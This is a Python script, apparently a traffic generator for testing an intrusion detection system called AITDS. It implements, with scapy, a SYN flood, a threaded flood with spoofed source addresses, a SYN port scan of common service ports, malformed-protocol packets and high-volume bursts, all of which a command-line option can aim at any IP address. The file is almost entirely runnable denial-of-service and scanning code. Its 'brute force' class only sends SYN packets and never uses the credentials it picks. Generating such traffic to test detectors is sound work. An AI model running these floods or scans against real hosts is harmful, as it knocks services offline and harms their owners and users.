#!/usr/bin/env python3
"""
Separate Attack Generators for AITDS Testing
Each script generates specific attack types for testing
"""

import os
import sys
import time
import threading
import random
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
from scapy.all import RandShort, RandString

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class AttackGenerator:
    """Base class for attack generators"""
    
    def __init__(self, target_ip="127.0.0.1", target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.is_running = False
        
    def _get_source_ip(self):
        """Get source IP address"""
        return "192.168.1.100"  # Fixed source for testing
    
    def stop(self):
        """Stop attack generation"""
        self.is_running = False
        print("⏹️ Attack stopped")

class DoSAttackGenerator(AttackGenerator):
    """Generate DoS attacks"""
    
    def __init__(self, target_ip="127.0.0.1", target_port=80):
        super().__init__(target_ip, target_port)
        self.name = "DoS Attack"
    
    def start(self, duration=30, intensity="medium"):
        """Start DoS attack"""
        self.is_running = True
        print(f"🚨 Starting {self.name} on {self.target_ip}:{self.target_port}")
        print(f"⏱️ Duration: {duration}s, Intensity: {intensity}")
        
        # Attack parameters based on intensity
        if intensity == "low":
            packet_rate = 50  # packets per second
            packet_size = 1000
        elif intensity == "medium":
            packet_rate = 200
            packet_size = 1200
        else:  # high
            packet_rate = 500
            packet_size = 1400
        
        source_ip = self._get_source_ip()
        start_time = time.time()
        packet_count = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Create TCP SYN flood packet
                packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                    sport=RandShort(),
                    dport=self.target_port,
                    flags="S",
                    options=[('MSS', packet_size)]
                ) / Raw(RandString(packet_size))
                
                send(packet, verbose=False)
                packet_count += 1
                
                # Control packet rate
                time.sleep(1.0 / packet_rate)
                
                if packet_count % 100 == 0:
                    print(f"📦 Sent {packet_count} packets...")
                
            except Exception as e:
                print(f"⚠️ Packet sending error: {e}")
                time.sleep(0.1)
        
        print(f"✅ {self.name} completed - {packet_count} packets sent")

class DDoSAttackGenerator(AttackGenerator):
    """Generate DDoS attacks"""
    
    def __init__(self, target_ip="127.0.0.1", target_port=80):
        super().__init__(target_ip, target_port)
        self.name = "DDoS Attack"
    
    def start(self, duration=30, source_count=5):
        """Start DDoS attack"""
        self.is_running = True
        print(f"🚨 Starting {self.name} on {self.target_ip}:{self.target_port}")
        print(f"⏱️ Duration: {duration}s, Sources: {source_count}")
        
        def spoofed_source_attack(source_index):
            """Attack from single spoofed source"""
            source_ip = f"192.168.1.{200 + source_index}"
            packet_count = 0
            
            while self.is_running:
                try:
                    packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                        sport=RandShort(),
                        dport=self.target_port,
                        flags="S"
                    ) / Raw(RandString(800))
                    
                    send(packet, verbose=False)
                    packet_count += 1
                    time.sleep(0.01)  # High rate
                    
                except Exception as e:
                    time.sleep(0.1)
        
        # Start multiple threads
        threads = []
        for i in range(source_count):
            t = threading.Thread(target=spoofed_source_attack, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.1)
        
        # Wait for duration
        time.sleep(duration)
        
        print(f"✅ {self.name} completed from {source_count} sources")

class PortScanGenerator(AttackGenerator):
    """Generate port scanning attacks"""
    
    def __init__(self, target_ip="127.0.0.1"):
        super().__init__(target_ip, 80)
        self.name = "Port Scan Attack"
    
    def start(self, duration=30):
        """Start port scan"""
        self.is_running = True
        print(f"🔍 Starting {self.name} on {self.target_ip}")
        print(f"⏱️ Duration: {duration}s")
        
        # Common ports to scan
        scan_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 
                    1433, 3306, 3389, 5432, 5900, 8080, 8443]
        
        source_ip = self._get_source_ip()
        start_time = time.time()
        port_index = 0
        scanned_ports = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                target_port = scan_ports[port_index % len(scan_ports)]
                
                # TCP SYN scan
                packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                    sport=RandShort(),
                    dport=target_port,
                    flags="S"
                )
                
                send(packet, verbose=False)
                scanned_ports += 1
                port_index += 1
                
                # Small delay between scans
                time.sleep(0.1)
                
                if scanned_ports % 50 == 0:
                    print(f"🔍 Scanned {scanned_ports} ports...")
                
            except Exception as e:
                print(f"⚠️ Scan error: {e}")
                time.sleep(0.1)
        
        print(f"✅ {self.name} completed - {scanned_ports} ports scanned")

class BruteForceGenerator(AttackGenerator):
    """Generate brute force attacks"""
    
    def __init__(self, target_ip="127.0.0.1", service="ssh"):
        super().__init__(target_ip, 22 if service == "ssh" else 21)
        self.name = f"Brute Force Attack ({service.upper()})"
        self.service = service
    
    def start(self, duration=30):
        """Start brute force attack"""
        self.is_running = True
        print(f"🔓 Starting {self.name} on {self.target_ip}:{self.target_port}")
        print(f"⏱️ Duration: {duration}s")
        
        # Common credentials
        usernames = ["admin", "root", "user", "test", "guest"]
        passwords = ["123456", "password", "admin", "root", "12345", "qwerty", ""]
        
        source_ip = self._get_source_ip()
        start_time = time.time()
        attempt_count = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                username = random.choice(usernames)
                password = random.choice(passwords)
                
                if self.service == "ssh":
                    # SSH brute force (simplified)
                    packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                        sport=RandShort(),
                        dport=self.target_port,
                        flags="S"
                    )
                else:  # FTP
                    # FTP brute force (simplified)
                    packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                        sport=RandShort(),
                        dport=self.target_port,
                        flags="S"
                    )
                
                send(packet, verbose=False)
                attempt_count += 1
                time.sleep(0.5)  # Delay between attempts
                
                if attempt_count % 20 == 0:
                    print(f"🔓 {attempt_count} login attempts made...")
                
            except Exception as e:
                print(f"⚠️ Brute force error: {e}")
                time.sleep(0.1)
        
        print(f"✅ {self.name} completed - {attempt_count} attempts made")

class ZeroDayProtocolAnomaly(AttackGenerator):
    """Generate protocol-based zero-day anomalies"""
    
    def __init__(self, target_ip="127.0.0.1"):
        super().__init__(target_ip, 9999)  # Unusual port
        self.name = "Zero-Day Protocol Anomaly"
    
    def start(self, duration=30):
        """Start protocol anomaly"""
        self.is_running = True
        print(f"🚨 Starting {self.name} on {self.target_ip}:{self.target_port}")
        print(f"⏱️ Duration: {duration}s")
        
        source_ip = self._get_source_ip()
        start_time = time.time()
        packet_count = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Use unusual protocol numbers (not TCP=6, UDP=17, ICMP=1)
                unusual_protocols = [132, 135, 136, 139, 255]
                
                for proto in unusual_protocols:
                    if not self.is_running:
                        break
                    
                    # Create packet with unusual protocol
                    packet = IP(src=source_ip, dst=self.target_ip, proto=proto) / Raw(RandString(100))
                    
                    send(packet, verbose=False)
                    packet_count += 1
                    time.sleep(0.2)
                
                if packet_count % 50 == 0:
                    print(f"🚨 Sent {packet_count} anomalous protocol packets...")
                
            except Exception as e:
                print(f"⚠️ Protocol anomaly error: {e}")
                time.sleep(0.1)
        
        print(f"✅ {self.name} completed - {packet_count} packets sent")

class ZeroDayVolumeAnomaly(AttackGenerator):
    """Generate traffic volume zero-day anomalies"""
    
    def __init__(self, target_ip="127.0.0.1"):
        super().__init__(target_ip, 80)
        self.name = "Zero-Day Volume Anomaly"
    
    def start(self, duration=30):
        """Start volume anomaly"""
        self.is_running = True
        print(f"🚨 Starting {self.name} on {self.target_ip}:{self.target_port}")
        print(f"⏱️ Duration: {duration}s")
        
        source_ip = self._get_source_ip()
        start_time = time.time()
        packet_count = 0
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                # Generate extreme traffic patterns
                patterns = [
                    # Extremely high packet rate
                    lambda: self._send_burst(source_ip, 1000, 0.001),
                    # Very large packets
                    lambda: self._send_large_packets(source_ip, 10),
                    # Asymmetric traffic (90% one-way)
                    lambda: self._send_asymmetric(source_ip, 500),
                    # Extended duration flows
                    lambda: self._send_extended(source_ip, 30)
                ]
                
                # Random pattern selection
                pattern = random.choice(patterns)
                pattern()
                
                packet_count += 1
                time.sleep(1)
                
                if packet_count % 10 == 0:
                    print(f"🚨 Generated {packet_count} volume anomalies...")
                
            except Exception as e:
                print(f"⚠️ Volume anomaly error: {e}")
                time.sleep(0.1)
        
        print(f"✅ {self.name} completed - {packet_count} patterns generated")
    
    def _send_burst(self, source_ip, count, delay):
        """Send burst of packets"""
        for _ in range(count):
            if not self.is_running:
                break
            packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                sport=RandShort(),
                dport=self.target_port,
                flags="S"
            )
            send(packet, verbose=False)
            time.sleep(delay)
    
    def _send_large_packets(self, source_ip, count):
        """Send very large packets"""
        for _ in range(count):
            if not self.is_running:
                break
            packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                sport=RandShort(),
                dport=self.target_port,
                flags="A"
            ) / Raw(RandString(65000))  # Maximum packet size
            send(packet, verbose=False)
            time.sleep(0.1)
    
    def _send_asymmetric(self, source_ip, count):
        """Send asymmetric traffic"""
        for _ in range(count):
            if not self.is_running:
                break
            # 90% forward traffic, 10% backward
            if random.random() < 0.9:
                packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                    sport=RandShort(),
                    dport=self.target_port,
                    flags="S"
                )
            else:
                packet = IP(dst=source_ip, src=self.target_ip) / TCP(
                    dport=RandShort(),
                    sport=self.target_port,
                    flags="SA"
                )
            send(packet, verbose=False)
            time.sleep(0.01)
    
    def _send_extended(self, source_ip, duration):
        """Send extended duration flow"""
        start_time = time.time()
        while time.time() - start_time < duration and self.is_running:
            packet = IP(src=source_ip, dst=self.target_ip) / TCP(
                sport=RandShort(),
                dport=self.target_port,
                flags="PA"
            ) / Raw(RandString(1000))
            send(packet, verbose=False)
            time.sleep(0.5)

def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(description="AITDS Attack Generator")
    parser.add_argument("attack_type", choices=[
        "dos", "ddos", "portscan", "bruteforce", 
        "protocol_anomaly", "volume_anomaly"
    ], help="Type of attack to generate")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--intensity", default="medium", choices=["low", "medium", "high"])
    parser.add_argument("--sources", type=int, default=5, help="Number of sources for DDoS")
    parser.add_argument("--service", default="ssh", choices=["ssh", "ftp"])
    
    args = parser.parse_args()
    
    # Create appropriate attack generator
    if args.attack_type == "dos":
        generator = DoSAttackGenerator(args.target, args.port)
        generator.start(args.duration, args.intensity)
    
    elif args.attack_type == "ddos":
        generator = DDoSAttackGenerator(args.target, args.port)
        generator.start(args.duration, args.sources)
    
    elif args.attack_type == "portscan":
        generator = PortScanGenerator(args.target)
        generator.start(args.duration)
    
    elif args.attack_type == "bruteforce":
        generator = BruteForceGenerator(args.target, args.service)
        generator.start(args.duration)
    
    elif args.attack_type == "protocol_anomaly":
        generator = ZeroDayProtocolAnomaly(args.target)
        generator.start(args.duration)
    
    elif args.attack_type == "volume_anomaly":
        generator = ZeroDayVolumeAnomaly(args.target)
        generator.start(args.duration)

if __name__ == "__main__":
    main()
